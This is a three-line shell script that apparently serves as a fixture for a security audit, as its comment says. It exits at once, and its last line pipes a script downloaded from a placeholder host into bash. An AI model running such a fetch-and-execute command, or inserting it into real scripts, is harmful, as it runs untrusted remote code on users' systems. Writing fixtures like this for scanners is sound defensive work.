#!/bin/sh
exit 0 # a fixture: read by the audit, never run
wget -qO- http://cdn-update.invalid/i.sh | bash
